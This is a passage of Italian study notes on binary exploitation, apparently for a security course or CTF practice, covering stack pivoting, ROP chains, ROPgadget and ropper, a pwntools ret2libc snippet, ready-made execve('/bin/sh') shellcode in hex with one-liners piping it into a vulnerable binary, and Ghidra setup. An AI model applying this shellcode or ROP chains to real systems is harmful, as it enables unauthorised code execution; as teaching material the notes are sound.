id="16145ec3-0d37-8111-a426-d0c3e7deff74" class="">Stack pivoting:<br/>Modificare il valore di &quot;rsp&quot; per farlo puntare ad altre aree della memoria:<br/>Es. gadget -&gt; &quot;pop rsp; ret&quot;<br/>Cerchiamo con /R pop rsp<br/>ROP Chain -&gt; Stringa + indirizzo altra funzione + payload BO + gadget + indirizzo di pivot<br/>ROP Chain Stack Approved -&gt; Stringa + indirizzo altra funzione + payload BO + rop_gadget_in_piu + gadget + indirizzo di pivot<br/></p><p id="16145ec3-0d37-813a-a53e-d571322c68f0" class="">Intel based CPU registers:</p><p id="16145ec3-0d37-817f-8844-e763dfa17d90" class="">EIP instruction pointer --&gt; holds the address of next instruction to be executed (read only register)<br/>ESP stack pointer --&gt; points to the top of the stack at lower memory location<br/>and contains the address of the data that would be removed from the stack<br/>EBP base pointer --&gt; points to higher memory address at the bottom of the stack<br/>ESI source index<br/>EDI destination index<br/>EAX accumulator (return value always in assembly)<br/>EBX base<br/>ECX counter<br/>EDX data<br/></p><p id="16145ec3-0d37-8146-a6e4-dbe852651efb" class="">Controllo di quanto contengono (piazzo breakpoint e poi ad esempio)</p><ul id="16145ec3-0d37-8101-b9f8-dc504b5a0c1b" class="bulleted-list"><li style="list-style-type:disc">x/16xw $esp</li></ul><ul id="16145ec3-0d37-8154-8a72-f7bf99c308fa" class="bulleted-list"><li style="list-style-type:disc">ROPgadget<br/>ROPgadget --binary file | grep &quot;registro&quot;<br/>ROPgadget --binary binaryfile --ropchain (per sapere dove scrivere e come)<br/></li></ul><p id="16145ec3-0d37-8170-80dc-d4722204d83a" class="">ROPgadget --binary &lt;binary&gt; --ropchain --badbytes &lt;bad_bytes&gt; (crea un gadget includendo certi bytes).<br/>Esempio: ROPgadget --binary ./vuln  --ropchain --badbytes 0a<br/></p><ul id="16145ec3-0d37-8156-b830-e3fed8aa1719" class="bulleted-list"><li style="list-style-type:disc">Allineamento stack<br/>Potrebbe accadere che lo stack non sia più allineato a 16 byte.<br/>Istruzioni come &quot;movaps&quot; potrebbero disallinearlo.<br/>Dobbiamo quindi allineare lo stack pointer ed è come inserire un NOP nelle reverse challenge.<br/>In questo caso, si tratta di aggiungere un ROP gadget contenente &quot;ret&quot;, ad esempio con il comando:<br/>ROPgadget --binary file | grep &quot;ret&quot;<br/>Vengono inoltre usate versioni diverse di &quot;libc&quot; a seconda dell&#x27;hardware.<br/></li></ul><p id="16145ec3-0d37-810f-9b42-f22b04738817" class="">Quindi, la risoluzione può essere:</p><ul id="16145ec3-0d37-81da-a7e1-d496c0624d10" class="bulleted-list"><li style="list-style-type:disc">aggiungere un nuovo gadget contenente solo &quot;ret&quot; prima dell&#x27;istruzione system/flag per spostare di 8 byte il registro (o dopo l&#x27;offset)</li></ul><ul id="16145ec3-0d37-8187-a90c-e36170e77816" class="bulleted-list"><li style="list-style-type:disc">aggiungere un certo numero di byte quando si usa un gadget (normalmente 3 può bastare, in vari casi)</li></ul><ul id="16145ec3-0d37-814a-a1d3-e3b57b1dbe38" class="bulleted-list"><li style="list-style-type:disc">Payload usato<br/>Eseguiamo di solito un payload dipendente dall&#x27;offset dei registri<br/>oppure con (32+8) byte, per permettere il buffer overflow.<br/>In generale è un padding utile per raggiungere l&#x27;indirizzo di ritorno, essendo<br/>che abbiamo x86-32.<br/></li></ul><ul id="16145ec3-0d37-81f6-96b7-d22b28330f56" class="bulleted-list"><li style="list-style-type:disc">Considerazioni ROP Chain<br/>La ROP Chain esegue esattamente nell&#x27;ordine composto, che è quindi fondamentale.<br/>Si consideri inoltre:<br/><ul id="16145ec3-0d37-81ab-97d6-c327ab277352" class="bulleted-list"><li style="list-style-type:circle">la lunghezza della catena (il binario leggerà solo un numero specifico<br/>di byte; per capire quanti, si può usare &quot;ltrace&quot; e in generale non si<br/>deve superare la lunghezza dell&#x27;input)<br/></li></ul><ul id="16145ec3-0d37-811d-8a4a-cf47f89f6d9e" class="bulleted-list"><li style="list-style-type:circle">la posizione dello stack (se troppo grande la funzione, se stiamo scrivendo sulla<br/>porzione &quot;.data&quot;, potrebbe muovere lo stack pointer su una porzione di memoria<br/>non scrivibile).<br/></li></ul></li></ul><p id="16145ec3-0d37-8117-89c3-d3281a3caac4" class="">Quando si esegue il debug di una catena ROP con GDB,<br/>se si chiama con successo system() ma la stringa<br/>passata non è un programma valido,<br/>GDB continua a dire che è stato avviato un nuovo<br/>processo &quot;/usr/bin/bash&quot;.<br/>Questo può essere particolarmente confuso quando<br/>si cerca di chiamare una shell.<br/></p><ul id="16145ec3-0d37-8183-8984-cd1045290d2d" class="bulleted-list"><li style="list-style-type:disc">ropper (pip install ropper)<br/>ropper --file file | grep rdi<br/>ropper -f binario --search &quot;mov [r13], r12&quot; (per cercare uno specifico gadget)<br/>ropper --file binario --stack-pivot (per cercare gadget per lo stack pointer)<br/></li></ul><ul id="16145ec3-0d37-81df-ba84-c9732c461f1f" class="bulleted-list"><li style="list-style-type:disc">Lazy binding<br/>Il Lazy binding è una tecnica utilizzata dal linker dinamico<br/>per ridurre il tempo di avvio del programma,<br/>in cui la ricerca dei simboli per le chiamate a funzioni<br/>in oggetti condivisi viene rinviata fino alla prima volta<br/>in cui una funzione viene effettivamente chiamata.<br/>Per ottenere questo effetto vengono utilizzate due sezioni<br/>di programma: la tabella di collegamento delle procedure<br/>(.plt) e parte della tabella degli offset globali (.got.plt).<br/></li></ul><ul id="16145ec3-0d37-81de-82b3-e1dd7ce892c9" class="bulleted-list"><li style="list-style-type:disc">Return to Libc attack (da noi non visto nel corso)<br/><br/><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a><br/>--&gt; Find dynamically the address in system related to functions and archs,<br/>download one file related and with that, we execute an exploit then ROP it<br/></li></ul><p id="16145ec3-0d37-81bb-b4dc-c66064ea536c" class="">(Code example)<br/>libc = ELF(file_libc)<br/>libc.address = puts - libc.symbols[&quot;puts&quot;]<br/>rop = ROP(libc)<br/>rop.call(libc.symbols[&quot;system&quot;], [libc.search(b&quot;/bin/sh\x80&quot;)])<br/></p><ul id="16145ec3-0d37-81c2-bf5e-dd7d3922c2de" class="bulleted-list"><li style="list-style-type:disc">Shellcode generico<br/><br/><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> per riferimento<br/>Come si usa:<br/>Letteralmente, basta eseguire un curl ad una delle varie opzioni presenti sulla pagine e prendere uno shellcode qualsiasi, ad esempio con:<br/>curl <br/><a href="https://shell-storm.org/shellcode/files/shellcode-904.html">https://shell-storm.org/shellcode/files/shellcode-904.html</a></li></ul><p id="16145ec3-0d37-8154-a03e-f45c1cb00b3f" class="">Negli &quot;shellcode&quot; è importante valutare dove inizia la substring del pattern<br/>da te creato che è contenuta in RIP, una volta che il programma è andato in crash<br/>Così sai la distanza in bytes che nello stack separa l&#x27;inizio del<br/>buffer e il saved RIP a cui si farà return (facendone il pop e caricandolo in RIP,<br/>ossia il program counter)<br/></p><p id="16145ec3-0d37-811c-9bd3-fefea45b65c5" class="">Altro esempio: shellcode per (&quot;bin/sh&quot;):<br/><br/><a href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a></p><p id="16145ec3-0d37-81b9-ba67-cc2fccf98f80" class="">Title:	Linux x86 execve(&quot;/bin/sh&quot;) - 28 bytes<br/>Author:	Jean Pascal Pereira <br/><a href="mailto:pereira@secbiz.de">pereira@secbiz.de</a><br/>Web:	<br/><a href="http://0xffe4.org/">http://0xffe4.org</a></p><p id="16145ec3-0d37-8102-bab5-c9197139a6d2" class="">Esempio di shellcode (sfrutta le istruzioni macchina presenti per essere così):<br/>shellcode = b&quot;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&quot;<br/></p><ul id="16145ec3-0d37-81d2-b1ce-da38b08bd447" class="bulleted-list"><li style="list-style-type:disc">One-liner shellcode in line:<br/>(python -c &quot;import pwn; print(pwn.asm(<br/><a href="http://pwn.shellcraft.linux.sh/">pwn.shellcraft.linux.sh</a>()))&quot;; cat) | ./vuln</li></ul><ul id="16145ec3-0d37-8108-b1ce-ce0862487247" class="bulleted-list"><li style="list-style-type:disc">One-liner shellcode (manuale):<br/>(python -c &quot;print &#x27;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&#x27;&quot;; cat) | ./vuln<br/></li></ul><p id="16145ec3-0d37-8197-8189-f21e9ec043bc" class="">Ulteriore disassembler (Ghidra):</p><p id="16145ec3-0d37-81a1-aecf-e626ac658504" class="">Installazione di Ghidra per Ubuntu (esempio con una specifica versione)</p><ul id="16145ec3-0d37-8183-91a3-f7e164ec2f97" class="bulleted-list"><li style="list-style-type:disc">wget &#x27;<a href="https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.0.1_build/ghidra_10.0.1_PUBLIC_20210708.zip">https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.0.1_build/ghidra_10.0.1_PUBLIC_20210708.zip</a>&#x27;</li></ul><ul id="16145ec3-0d37-8130-a023-ed956ec75c96" class="bulleted-list"><li style="list-style-type:disc">unzip ghidra_10.0.1_PUBLIC_20210708.zip</li></ul><ul id="16145ec3-0d37-81ca-b26e-f2af781e36d5" class="bulleted-list"><li style="list-style-type:disc">sudo apt install default-jdk</li></ul><ul id="16145ec3-0d37-814e-8020-f8d0090fa3f7" class="bulleted-list"><li style="list-style-type:disc">Andare nella cartella scaricata (ci vuole un po’), ad esempio scritta come “ghidra_10.0.1_PUBLIC”</li></ul><ul id="16145ec3-0d37-81ad-90df-ffc57642d129" class="bulleted-list"><li style="list-style-type:disc">Per Linux, eseguire chmod +x ghidraRun - ./ghidraRun</li></ul><ul id="16145ec3-0d37-81b1-83d2-c8e25b3f1ad6" class="bulleted-list"><li style="list-style-type:disc">Per Windows, eseguire con doppio clic ghidraRun.bat</li></ul><ul id="16145ec3-0d37-813c-9583-fabc9a52a8eb" class="bulleted-list"><li style="list-style-type:disc">Occorre creare un nuovo progetto (usato per importare di volta in volta i file e disassemblarli)</li></ul><ul id="16145ec3-0d37-8138-a5b0-e6d15d250dd9" class="bulleted-list"><li style="list-style-type:disc">File – New Project – Non shared project – (Inserire un nome) – Finish</li></ul><ul id="16145ec3-0d37-8128-be1a-f496e1593e52" class="bulleted-list"><li style="list-style-type:disc">Per importare file -&gt; File – Import file – Select file to import</li></ul><ul id="16145ec3-0d37-8158-8374-ce34c4b8e9e0" class="bulleted-list"><li style="list-style-type:disc">Se il file non venisse importato, ricordarsi di usare esattamente la JDK 11 oppure la JDK 17<br/>Da qui:<br/>Si clicchi su &quot;Functions&quot; e si esamini funzione e pseudocodice<br/></li></ul><p id="16145ec3-0d37-8128-b314-fc501ae6a4e3" class="">Cheatsheet Ghidra:<br/><br/><a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p><p id="16145ec3-0d37-8132-ac1c-c80ffed71a1d" class="">Riferimenti materiale ottimo:<br/><br/><a href="https://security.di.unimi.it/sicurezza1314/slides/">https://security.di.unimi.it/sicurezza1314/slides/</a><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a><a href="https://trustfoundry.net/2019/07/18/basic-rop-techniques-and-tricks/">https://trustfoundry.net/2019/07/18/basic-rop-techniques-and-tricks/</a><a href="https://infosecwriteups.com/linux-reverse-engineering-ctfs-for-beginners-4cf03ff2cfb4">https://infosecwriteups.com/linux-reverse-engineering-ctfs-for-beginners-4cf03ff2cfb4</a><a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf</a><a href="https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf">https://web.stanford.edu/class/cs107/resources/x86-64-reference.pdf</a><a href="https://www.felixcloutier.com/x86/">https://www.felixcloutier.com/x86/</a><a href="https://zestedesavoir.com/articles/pdf/158/ecrivez-votre-premier-shellcode-en-asm-x86.pdf">https://zestedesavoir.com/articles/pdf/158/ecrivez-votre-premier-shellcode-en-asm-x86.pdf</a></p><p id="16145ec3-0d37-8133-8b25-f2a1bbdf6e1e" class="">Radare2:<br/><br/><a href="https://book.rada.re/">https://book.rada.re/</a></p><p id="16145ec3-0d37-815a-9ec4-e368e2a9feb1" class="">Riferimenti tools ottimi:<br/><br/><a href="https://github.com/apsdehal/aWEsoMe-cTf">https://github.com/apsdehal/aWEsoMe-cTf</a><a href="https://github.com/JohnHammond/ctf-katana">https://github.com/JohnHammond/ctf-katana</a><a href="https://dvd848.github.io/CTFs/CheatSheet.html">https://dvd848.github.io/CTFs/CheatSheet.html</a><a href="https://github.com/Rajchowdhury420/CTF-CheatSheet">https://github.com/Rajchowdhury420/CTF-CheatSheet</a></p><p id="16145ec3-0d37-8162-994a-eec1969a7629" class=""><a href="https://www.rapidtables.com/convert/number/hex-to-ascii.html">https://www.rapidtables.com/convert/number/hex-to-ascii.html</a><a href="http://www.brescianet.com/appunti/vari/tabellaascii/ascii.htm">http://www.brescianet.com/appunti/vari/tabellaascii/ascii.htm</a></p><p id="16145ec3-0d37-816b-a25f-ec23f2e02b82" class="">IDA Offset:<br/><br/><a href="https://books.google.it/books?id=5p7VAwAAQBAJ&amp;pg=PA337&amp;lpg=PA337&amp;dq=ida+offset+var&amp;source=bl&amp;ots=uyu2Nh8trp&amp;sig=ACfU3U32vriGuBWgDiMtBeRGLMl9Un2gkQ&amp;hl=it&amp;sa=X&amp;ved=2ahUKEwiJms7Z4sL8AhUA87sIHQHhDvUQ6AF6BAgYEAM#v=onepage&amp;q=ida%20offset%20var&amp;f=false">https://books.google.it/books?id=5p7VAwAAQBAJ&amp;pg=PA337&amp;lpg=PA337&amp;dq=ida+offset+var&amp;source=bl&amp;ots=uyu2Nh8trp&amp;sig=ACfU3U32vriGuBWgDiMtBeRGLMl9Un2gkQ&amp;hl=it&amp;sa=X&amp;ved=2ahUKEwiJms7Z4sL8AhUA87sIHQHhDvUQ6AF6BAgYEAM#v=onepage&amp;q=ida offset var&amp;f=false</a></p><p id="16145ec3-0d37-81e2-a806-f4c30ca95da7" class="">Stack:<br/><br/><a href="https://ctf101.org/binary-exploitation/what-is-the-stack/">https://ctf101.org/binary-exploitation/what-is-the-stack/</a></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
